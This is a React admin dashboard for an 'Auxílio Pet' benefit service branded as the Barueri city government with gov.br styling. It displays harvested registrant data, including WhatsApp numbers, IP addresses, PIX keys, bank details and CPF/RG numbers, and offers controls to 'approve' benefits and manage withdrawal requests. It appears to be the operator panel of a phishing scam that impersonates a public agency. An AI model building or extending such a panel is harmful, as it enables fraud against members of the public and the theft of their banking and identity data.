import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../lib/supabase';
import { Eye, ArrowLeft, LogOut, CheckCircle, Banknote, User, FileText, ShieldCheck, MapPin } from 'lucide-react';

interface Registration {
  id: string;
  full_name: string;
  email: string;
  whatsapp: string;
  ip_address: string;
  created_at: string;
  status_analise: string;
  status_saque: string;
  chave_pix: string;
  instituicao_bancaria: string;
  nome_titular: string;
  documento_titular: string;
  reside_brasil: boolean;
}

const BARUERI_LOGO_URL = "/logo_barueri.png";

function AdminNew() {
  const navigate = useNavigate();
  const [registrations, setRegistrations] = useState<Registration[]>([]);
  const [selectedUser, setSelectedUser] = useState<Registration | null>(null);
  const [activeTab, setActiveTab] = useState<'pendentes' | 'saques'>('pendentes');

  useEffect(() => {
    loadData();
  }, []);

  const loadData = async () => {
    const { data } = await supabase
      .from('registrations')
      .select('*')
      .order('created_at', { ascending: false });

    setRegistrations((data as Registration[]) || []);
  };

  const handleApprove = async (id: string) => {
    await (supabase.from('registrations') as any)
      .update({ status_analise: 'aprovado' })
      .eq('id', id);
    alert('Usuário aprovado com sucesso! A tela do cliente será atualizada.');
    loadData();
  };

  const formatDate = (dateString: string) => new Date(dateString).toLocaleString('pt-BR');

  const pendingUsers = registrations.filter(r => r.status_analise !== 'aprovado');
  const withdrawalUsers = registrations.filter(r => r.status_saque === 'solicitado');

  // --- TELA DE DETALHES DO USUÁRIO ---
  if (selectedUser) {
    return (
      <div className="min-h-screen bg-[#F8F9FA] font-sans flex flex-col">
        {/* BARRA SUPERIOR GOV.BR */}
        <div className="w-full bg-[#1351B4] py-1 px-4 text-xs flex justify-between items-center text-white">
          <span className="font-bold tracking-wider">PREFEITURA DE BARUERI - MÓDULO ADMINISTRATIVO</span>
        </div>
        <div className="w-full h-[4px] bg-gradient-to-r from-red-600 via-white to-black"></div>

        <header className="bg-white border-b border-gray-200 py-3 px-6 shadow-sm sticky top-0 z-40">
          <div className="container mx-auto max-w-4xl flex items-center justify-between">
            <div className="flex items-center gap-4">
              <button onClick={() => setSelectedUser(null)} className="text-gray-500 hover:text-[#1351B4] transition-colors flex items-center gap-1">
                <ArrowLeft size={20} /> Voltar
              </button>
            </div>
            <div className="font-bold text-[#1351B4] text-lg flex items-center gap-2">
              <ShieldCheck size={20} /> Detalhes do Cadastro
            </div>
          </div>
        </header>

        <main className="flex-1 container mx-auto px-4 py-8 max-w-4xl">
          <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden">
            <div className="p-6 md:p-8">
              <h2 className="text-2xl font-black text-[#333] mb-6 border-b-2 border-gray-100 pb-4">
                Ficha Cadastral: {selectedUser.full_name}
              </h2>
              
              <div className="grid md:grid-cols-2 gap-8">
                {/* DADOS PESSOAIS */}
                <div className="space-y-4">
                  <h3 className="font-bold text-[#1351B4] flex items-center gap-2 text-lg">
                    <User size={20} /> Dados Pessoais
                  </h3>
                  <div className="bg-gray-50 p-4 rounded-lg border border-gray-100 space-y-3 text-sm">
                    <p><strong className="text-gray-700">Nome:</strong> {selectedUser.full_name}</p>
                    <p><strong className="text-gray-700">Email:</strong> {selectedUser.email}</p>
                    <p><strong className="text-gray-700">WhatsApp:</strong> {selectedUser.whatsapp}</p>
                    <p><strong className="text-gray-700">IP de Registro:</strong> <span className="font-mono bg-gray-200 px-1 rounded">{selectedUser.ip_address || 'Não capturado'}</span></p>
                    <p><strong className="text-gray-700">Data do Cadastro:</strong> {formatDate(selectedUser.created_at)}</p>
                  </div>
                </div>

                {/* DADOS BANCÁRIOS / PIX */}
                <div className="space-y-4">
                  <h3 className="font-bold text-green-700 flex items-center gap-2 text-lg">
                    <Banknote size={20} /> Dados de Repasse (PIX)
                  </h3>
                  <div className="bg-green-50 p-4 rounded-lg border border-green-200 space-y-3 text-sm">
                    <p><strong className="text-green-900">Chave PIX:</strong> {selectedUser.chave_pix || 'Não informada'}</p>
                    <p><strong className="text-green-900">Banco:</strong> {selectedUser.instituicao_bancaria || 'Não informado'}</p>
                    <p><strong className="text-green-900">Nome do Titular:</strong> {selectedUser.nome_titular || 'Não informado'}</p>
                    <p><strong className="text-green-900">Documento (CPF/RG):</strong> {selectedUser.documento_titular || 'Não informado'}</p>
                    <p><strong className="text-green-900">Reside no Brasil?</strong> {selectedUser.reside_brasil ? 'Sim' : 'Não'}</p>
                  </div>
                </div>
              </div>

              {/* BOTÃO DE APROVAÇÃO */}
              <div className="mt-8 pt-6 border-t border-gray-100">
                {selectedUser.status_analise !== 'aprovado' ? (
                  <button 
                    onClick={() => { handleApprove(selectedUser.id); setSelectedUser(null); }} 
                    className="w-full md:w-auto md:float-right bg-[#00A91C] hover:bg-green-700 text-white font-bold py-4 px-8 rounded-lg shadow-lg hover:shadow-xl transition-all flex items-center justify-center gap-2 uppercase tracking-wide"
                  >
                    <CheckCircle size={22} /> Aprovar Benefício Agora
                  </button>
                ) : (
                  <div className="w-full md:w-auto md:float-right bg-gray-100 text-gray-500 font-bold py-4 px-8 rounded-lg flex items-center justify-center gap-2 uppercase tracking-wide border border-gray-200">
                    <CheckCircle size={22} /> Cadastro Já Aprovado
                  </div>
                )}
                <div className="clear-both"></div>
              </div>

            </div>
          </div>
        </main>
      </div>
    );
  }

  // --- TELA PRINCIPAL (LISTAGEM) ---
  return (
    <div className="min-h-screen bg-[#F8F9FA] font-sans flex flex-col">
      {/* BARRA SUPERIOR GOV.BR */}
      <div className="w-full bg-[#1351B4] py-1 px-4 text-xs flex justify-between items-center text-white">
        <span className="font-bold tracking-wider">PREFEITURA DE BARUERI - GESTÃO</span>
      </div>
      <div className="w-full h-[4px] bg-gradient-to-r from-red-600 via-white to-black"></div>

      <header className="bg-white border-b border-gray-200 py-3 px-4 md:px-8 shadow-sm flex flex-col md:flex-row items-center justify-between gap-4">
        <div className="flex items-center gap-4">
          <img src={BARUERI_LOGO_URL} alt="Barueri" className="h-10 md:h-12 object-contain" />
          <div className="h-8 w-px bg-gray-300 hidden md:block"></div>
          <div className="font-bold text-[#1351B4] text-lg flex items-center gap-2">
            <ShieldCheck size={24} /> Central do Auxílio Pet
          </div>
        </div>
        <button onClick={() => navigate('/')} className="bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold px-4 py-2 rounded flex items-center gap-2 transition-colors text-sm">
          <LogOut size={16} /> Sair do Painel
        </button>
      </header>

      <main className="flex-1 container mx-auto px-4 py-8 max-w-6xl">
        <div className="flex flex-col sm:flex-row gap-2 mb-6">
          <button 
            onClick={() => setActiveTab('pendentes')} 
            className={`flex-1 py-4 px-6 font-bold rounded-t-lg border-b-4 transition-all ${activeTab === 'pendentes' ? 'bg-white text-[#1351B4] border-[#1351B4] shadow-sm' : 'bg-gray-100 text-gray-500 border-transparent hover:bg-gray-200'}`}
          >
            Contas em Análise ({pendingUsers.length})
          </button>
          <button 
            onClick={() => setActiveTab('saques')} 
            className={`flex-1 py-4 px-6 font-bold rounded-t-lg border-b-4 transition-all ${activeTab === 'saques' ? 'bg-white text-[#00A91C] border-[#00A91C] shadow-sm' : 'bg-gray-100 text-gray-500 border-transparent hover:bg-gray-200'}`}
          >
            Requisições de Saque ({withdrawalUsers.length})
          </button>
        </div>

        <div className="bg-white rounded-b-xl rounded-tr-xl shadow-sm border border-gray-200 overflow-x-auto">
          <table className="w-full text-left text-sm text-gray-600">
            <thead className="bg-[#f1f5f9] border-b border-gray-200 text-gray-700">
              <tr>
                <th className="px-6 py-4 font-bold">Solicitante</th>
                <th className="px-6 py-4 font-bold">Contato</th>
                <th className="px-6 py-4 font-bold">Data</th>
                <th className="px-6 py-4 font-bold">Status</th>
                <th className="px-6 py-4 font-bold text-center">Ação</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-100">
              {(activeTab === 'pendentes' ? pendingUsers : withdrawalUsers).map((user) => (
                <tr key={user.id} className="hover:bg-blue-50/50 transition-colors">
                  <td className="px-6 py-4">
                    <div className="font-bold text-[#333]">{user.full_name}</div>
                    <div className="text-xs text-gray-500 mt-1">{user.email}</div>
                  </td>
                  <td className="px-6 py-4 font-medium">{user.whatsapp}</td>
                  <td className="px-6 py-4 text-xs">{formatDate(user.created_at)}</td>
                  <td className="px-6 py-4">
                    {activeTab === 'pendentes' ? (
                      <span className="bg-blue-100 text-[#1351B4] px-3 py-1 rounded-full text-xs font-bold border border-blue-200">Em Análise</span>
                    ) : (
                      <span className="bg-green-100 text-[#00A91C] px-3 py-1 rounded-full text-xs font-bold border border-green-200 flex items-center gap-1 w-max animate-pulse">
                        <Banknote size={14} /> Saque Pendente
                      </span>
                    )}
                  </td>
                  <td className="px-6 py-4">
                    <div className="flex items-center justify-center gap-2">
                      <button 
                        onClick={() => setSelectedUser(user)} 
                        className="p-2 bg-gray-100 text-gray-700 rounded hover:bg-gray-200 transition-colors flex items-center gap-1 text-xs font-bold" 
                        title="Ver Ficha Completa"
                      >
                        <Eye size={16}/> Abrir Ficha
                      </button>
                      {activeTab === 'pendentes' && (
                        <button 
                          onClick={() => handleApprove(user.id)} 
                          className="p-2 bg-[#00A91C] text-white rounded hover:bg-green-700 transition-colors" 
                          title="Aprovar Imediatamente"
                        >
                          <CheckCircle size={16}/>
                        </button>
                      )}
                    </div>
                  </td>
                </tr>
              ))}
              {(activeTab === 'pendentes' ? pendingUsers : withdrawalUsers).length === 0 && (
                <tr>
                  <td colSpan={5} className="text-center py-16 text-gray-500">
                    <FileText className="mx-auto h-12 w-12 text-gray-300 mb-3" />
                    <p className="text-lg font-medium">Nenhum registro encontrado nesta categoria.</p>
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </main>
    </div>
  );
}

export default AdminNew;